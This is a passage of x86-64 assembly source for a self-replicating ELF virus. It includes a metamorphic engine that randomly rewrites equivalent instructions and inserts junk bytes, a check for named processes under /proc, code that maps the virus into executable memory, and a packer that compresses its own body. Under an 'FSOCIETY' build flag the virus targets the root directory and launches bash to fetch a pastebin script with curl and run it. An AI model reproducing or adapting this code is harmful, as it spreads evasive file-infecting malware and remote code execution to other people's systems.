			pop rdi
			cmp rax, 0x0
			je .inc_rcx
			mov rdx, rdi
			push rdi
			push rcx
			lea rdi, [rel swap_registry]
			mov rsi, 16
			add rdx, 2
			mov rcx, 1
			call _ft_memmem
			pop rcx
			pop rdi
			cmp rax, 0x0
			je .inc_rcx
			inc rax
			xor rdx, rdx
			mov dl, byte[rax]
			mov byte[rdi], 0x41
			mov byte[rdi + 1], dl
			mov dword[rdi + 2], 0x00000000
			add rcx, 5
			jmp .inc_rcx
		.swap_instruction_pattern_c:; mov rax, 0; nop -> xor rax, rax; nop; nop; nop
			cmp byte[rdi + 5], 0x90
			jne .inc_rcx
			push rdi
			mov rdi, 2
			call _rand_modulo
			pop rdi
			cmp rax, 0x0
			je .inc_rcx
			mov rdx, rdi
			push rdi
			push rcx
			lea rdi, [rel swap_registry]
			mov rsi, 16
			add rdx, 2
			mov rcx, 1
			call _ft_memmem
			pop rcx
			pop rdi
			cmp rax, 0x0
			je .inc_rcx
			dec rax
			xor rdx, rdx
			mov dl, byte[rax]
			mov word[rdi], `\x48\x31`
			mov byte[rdi + 2], dl
			mov word[rdi + 3], 0x9090
			mov byte[rdi + 5], 0x90
			add rcx, 5
			jmp .inc_rcx
		.swap_instruction_pattern_d:; mov r8, 0 -> xor r8, r8; ;nop; nop; nop
			cmp dword[rdi + 2], 0x00000000
			jne .inc_rcx
			push rdi
			mov rdi, 2
			call _rand_modulo
			pop rdi
			cmp rax, 0x0
			je .inc_rcx
			mov rdx, rdi
			push rdi
			push rcx
			lea rdi, [rel swap_registry]
			mov rsi, 16
			add rdx, 2
			mov rcx, 1
			call _ft_memmem
			pop rcx
			pop rdi
			cmp rax, 0x0
			je .inc_rcx
			dec rax
			xor rdx, rdx
			mov dl, byte[rax]
			mov word[rdi], `\x4d\x31`
			mov byte[rdi + 2], dl
			mov word[rdi + 3], 0x9090
			mov byte[rdi + 5], 0x90
			add rcx, 5
			jmp .inc_rcx
		.swap_instruction_pattern_e:; push 9; nop; pop rax; nop -> mov rax, 9
			cmp byte[rdi + 2], 0x90
			jne .inc_rcx
			cmp byte[rdi + 4], 0x90
			jne .inc_rcx
			push rdi
			mov rdi, 2
			call _rand_modulo
			pop rdi
			cmp rax, 0x0
			je .inc_rcx
			mov dl, byte[rdi + 3]
			add dl, 0x60
			mov byte[rdi], dl
			mov word[rdi + 2], 0x0000
			mov byte[rdi + 4], 0x0
			add rcx, 4
			jmp .inc_rcx
		.swap_instruction_pattern_f:; mov rax, 9 -> push 9; nop; pop rax; nop
			cmp word[rdi + 2], 0x0000
			jne .inc_rcx
			cmp byte[rdi + 4], 0x00
			jne .inc_rcx
			push rdi
			mov rdi, 2
			call _rand_modulo
			pop rdi
			cmp rax, 0x0
			je .inc_rcx
			mov dl, byte[rdi]
			sub dl, 0x60
			mov byte[rdi], 0x6a
			mov byte[rdi + 2], 0x90
			mov byte[rdi + 3], dl
			mov byte[rdi + 4], 0x90
			add rcx, 4
			jmp .inc_rcx
		.swap_instruction_pattern_g:; after jmp $+4
			push rdi
			mov rdi, 256
			call _rand_modulo
			pop rdi
			mov byte[rdi + 2], al
			push rdi
			mov rdi, 256
			call _rand_modulo
			pop rdi
			mov byte[rdi + 3], al
			add rcx, 4
			jmp .inc_rcx
		.swap_instruction_pattern_h:; or r8, 0x0 // and r8, -1
			cmp byte[rdi + 3], 0xff
			je .ff
			cmp byte[rdi + 3], 0x00
			jne .inc_rcx
				cmp byte[rdi + 2], 0xc0
				jl .inc_rcx
				cmp byte[rdi + 2], 0xcf
				jg .inc_rcx
			jmp .continue_h
			.ff:
				cmp byte[rdi + 2], 0xe0
				jl .inc_rcx
				cmp byte[rdi + 2], 0xe7
				jg .inc_rcx
			.continue_h:
				push rdi
				mov rdi, 2
				call _rand_modulo
				pop rdi
				mov byte[rdi], 0x48
				add byte[rdi], al
			push rdi
			mov rdi, 3
			call _rand_modulo
			pop rdi
			cmp rax, 0x0
			je .ff_res
				mov byte[rdi + 3], 0x00
				mov byte[rdi + 2], 0xc0
				push rdi
				mov rdi, 16
				call _rand_modulo
				pop rdi
				add byte[rdi + 2], al
			jmp .end_h
			.ff_res:
				mov byte[rdi + 3], 0xff
				mov byte[rdi + 2], 0xe0
				push rdi
				mov rdi, 8
				call _rand_modulo
				pop rdi
				add byte[rdi + 2], al
			.end_h:
			add rcx, 3
			jmp .inc_rcx
		.inc_rcx:
			pop rsi
			pop rdi
			inc rcx
	jmp .substitute_instruction
	.end_substitute_instruction:
	pop rax

	pop rdx
	pop rcx
	pop rsi
	pop r11
	pop r9
	pop r8
ret

_rand_modulo:; rdi modulo
	push rcx
	push rdx

		call _rand
		xor rdx, rdx
		div rdi
		mov rax, rdx

	pop rdx
	pop rcx
ret

_rand:
	push rdi
	push rsi
	push rdx
		sub rsp, 16; sizeof struct timeval
		lea rdi, [rsp]
		xor rsi, rsi
		push SYSCALL_GETTIMEOFDAY; gettimeofday
		pop rax
		syscall

		mov rax, qword[rsp + 8]

		add rsp, 16
	pop rdx
	pop rsi
	pop rdi
ret

swap_registry db `\xc0\xb8\xff\xbf\xf6\xbe\xd2\xba\xc9\xb9\xdb\xbb\xe4\xbc\xed\xbd`

;						fingerprint
_update_fingerprint:; (string rdi)
	push rdx
	push rcx
	push rsi
	push r8
	push r9

	mov rsi, rdi
	add rsi, 9
	push 1
	pop r9
	.find_non_zero:
		cmp byte[rsi], '0'
		jne .end_find_non_zero
		inc r9
		inc rsi
		jmp .find_non_zero
	.end_find_non_zero:
	push 4
	pop r8
	sub r8, r9

	xor r9, r9
	.reset_count_key:
		xor rdx, rdx
	.edit_fingerprint:
		cmp r9, 8
		je .end_edit_fingerprint
		xor rax, rax
		mov rcx, r9
		mov ah, byte[rdi + rcx]
		cmp ah, '9'
		jle .no_alpha_0
		add ah, 9
		.no_alpha_0:
		and ah, 0x0f
		xor rcx, rcx
		mov ch, byte[rsi + rdx]
		cmp ch, '9'
		jle .no_alpha_1
		add ch, 9
		.no_alpha_1:
		and ch, 0x0f
		add ah, ch
		push rdx
		movzx eax, ah
		xor rdx, rdx
		mov ecx, 0x10
		div ecx
		xor rax, rax
		mov ah, dl
		lea rdx, [rel hex_nums]
		xor rcx, rcx
		movzx ecx, ah
		mov ah, byte[rdx + rcx]
		mov rcx, r9
		mov byte[rdi + rcx], ah
		pop rdx
		inc r9
		inc rdx
		cmp rdx, r8
		jg .reset_count_key
		jmp .edit_fingerprint
	.end_edit_fingerprint:
	pop r9
	pop r8
	pop rsi
	pop rcx
	pop rdx
ret

_check_file_process:; (string rdi)
	push r8
	push rcx
	push rdx
	push rsi

	sub rsp, 0x800; buffer to read

	xor rsi, rsi; O_RDONLY
	push SYSCALL_OPEN
	pop rax; open
	syscall
	push rdi
	pop r8
	push rax
	pop r9; fd
	xor rax, rax ; read and 0 if can't open
	cmp r9, 0x0
	jl .return; jump lower

	mov rdi, r9
	mov rsi, rsp
	push 0x800
	pop rdx
	syscall

	cmp rax, 0x0
	je .close

		push rax
		pop rsi
		lea rdi, [rel process]
		xor rcx, rcx; = 0
		.loop_array_string:
			add rdi, rcx
			; check if it is in the file
			call _ft_strlen
			cmp rsi, rax
			jl .close
			push rax
			pop rcx
			push rdi
			pop rdx
			mov rdi, rsp; buffer
			call _ft_memmem
			cmp rax, 0x0
			jne .close
			push rdx
			pop rdi
		inc rcx
		cmp byte[rdi + rcx], 0x0
		jnz .loop_array_string

	xor rax, rax
	.close:
		push rax
		pop rsi
		push r9
		pop rdi
		push SYSCALL_CLOSE
		pop rax; close
		syscall
		push rsi
		pop rax
	.return:
		push r8
		pop rdi

	add rsp, 0x800

	pop rsi
	pop rdx
	pop rcx
	pop r8
ret

; -------------------------------- utils ---------------------------------------

_ft_concat_path: ;(string rdi, string rsi) -> rdi is dest, must be in stack or mmaped region
	push rdx

	mov rdx, rdi
	push rdx
	call _ft_strlen
	add rdi, rax
	mov byte[rdi], '/'
	inc rdi
	call _ft_strcpy
	pop rdi
	mov rax, rdi

	pop rdx
ret

_ft_isnum:; (string rdi) ; 0 no - otherwise rax something else
	xor rax, rax
	.loop_char:
		cmp byte[rdi + rax], 0x0
		je .return
		cmp byte[rdi + rax], '0'
		jl .isnotnum
		cmp byte[rdi + rax], '9'
		jg .isnotnum
		inc rax
	jmp .loop_char
	.isnotnum:
		xor rax, rax
	.return:
ret

_ft_strcmp: ; (string rdi, string rsi)
	push rdx

	call _ft_strlen
	push rax
	pop rdx
	call _ft_memcmp

	pop rdx
ret

_ft_strcpy: ; (string rdi, string rsi)
	push rdx

	push rdi
	pop rdx
	push rsi
	pop rdi
	call _ft_strlen
	push rdi
	pop rsi
	push rdx
	pop rdi
	push rax
	pop rdx
	inc rdx
	call _ft_memcpy

	pop rdx
ret

; ---------------------------- STATIC PARAMS -----------------------------------

;                   E     L    F   |  v ELFCLASS64
elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
hex_nums db `0123456789abcdef`, 0x0
%ifdef FSOCIETY
	directories db `/`, 0x0, 0x0
	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, 0x0
	devnull db `/dev/null`, 0x0
	argv0 db `/bin/setsid`, 0x0
	argv1 db `/bin/bash`, 0x0
	argv2 db `-c`, 0x0
	argv3 db `$(curl -s https://pastebin.com/raw/bnNiVmsD | /bin/bash -i)`, 0x0
%else
	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
	dotdir db `.`, 0x0, `..`, 0x0, 0x0
%endif

	process_dir db `/proc`, 0x0
	process_status db `status`, 0x0
	process db `\ttest\n`, 0x0, `\tcat\n`, 0x0, 0x0

_eof:

; ------------------------------- HOST ---------------------------------------

; don't need to copy the host part
; v
_make_virus_map:
	; copy the virus into a mmap executable
	xor rdi, rdi; NULL

	lea rsi, [rel _eof]
	lea r8, [rel _params]
	sub rsi, r8
	push 7
	pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
	push 34
	pop r10; MAP_PRIVATE | MAP_ANON
	push -1
	pop r8 ; fd
	xor r9, r9; offset
	push SYSCALL_MMAP
	pop rax; mmap
	syscall

	; ==		copy start of the virus
	mov rdi, rax
	push rax; save

	lea rsi, [rel _start]
	lea rdx, [rel _pack_start]
	sub rdx, rsi
	call _ft_memcpy

	; ==		pack a part
	add rdi, rdx
	call _pack
	push rax
	pop r14; size
	add r14, rdx
	add r14, 8 * 3
	pop r8
ret

_munmap_virus:
	push r8
	pop rdi ; pop addr
	lea rsi, [rel _eof]
	lea r8, [rel _params]
	sub rsi, r8

	; munmap the previous exec
	push SYSCALL_MUNMAP
	pop rax
	syscall
ret

;               v dest
_pack: ;(void *rdi) -> ret size + fill rdi
	push r8
	push r10
	push r11
	push r12
	push rbx
	push rcx
	push rdx
	push rsi

	lea rdx, [rel _eof]
	lea r10, [rel _pack_start] ; dictionary = addr
	mov r11, r10; buffer = addr
	sub rdx, r10; size

	xor rcx, rcx; i = 0
	xor r8, r8; l = 0
	.loop_compress:
		cmp rcx, rdx; while (i < size) {
		jge .end_compress
		mov rsi, r10
		sub rsi, r11; len = dictionary - buffer
		cmp rsi, 255; if (len > 255) {
		jle .continue
		add r11, rsi
		sub r11, 255; buffer += len - 255
		mov rsi, r10
		sub rsi, r11; len = dictionary - buffer
		.continue: ; }
		push 1
		pop rbx; k = 1
		xor r12, r12; prev_ret = 0
		.loop_memmem:; while
			cmp rbx, 255
			jge .end_memmem; (k < 255
			mov rax, rbx
			add rax, rcx
			cmp rax, rdx; && i + k < size)
			jge .end_memmem
			push rdi
			push rdx
			push rcx
			mov rdi, r11
			mov rdx, r10
			mov rcx, rbx
			call _ft_memmem; ret = ft_memmem(buffer, len, dictionary, k)
			pop rcx
			pop rdx
			pop rdi
			cmp rax, 0x0; if (!ret) break
			je .end_memmem
			push rax
			pop r12; prev_ret = ret
			inc rbx; k++
		jmp .loop_memmem
		.end_memmem:; }
		dec rbx; k--
		cmp r12, 0x0; if (prev_ret
		je .not_compress_char
		cmp rbx, 4; && k >= 4) {
		jl .not_compress_char
		mov byte[rdi + r8], MAGIC_CHAR; addr[l] = MAGIC_CHAR
		inc r8; l++
		mov rax, r10
		sub rax, r12
		mov byte[rdi + r8], al; addr[l] = dictionary - prev_ret
		inc r8; l++
		mov rax, rbx
		mov byte[rdi + r8], al; addr[l] = k
		inc r8; l++
		jmp .next_loop; }
		.not_compress_char:; else {
		push 1
		pop rbx; k = 1
		mov al, [r10]
		mov byte[rdi + r8], al; addr[l] = *dictionary
		inc r8; l++
	.next_loop:; }
		add r10, rbx; dictionary += k
		add rcx, rbx; i += k
		jmp .loop_compress
	.end_compress: ; }
		push r8
		pop rax

	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop r12
	pop r11
	pop r10
	pop r8
ret

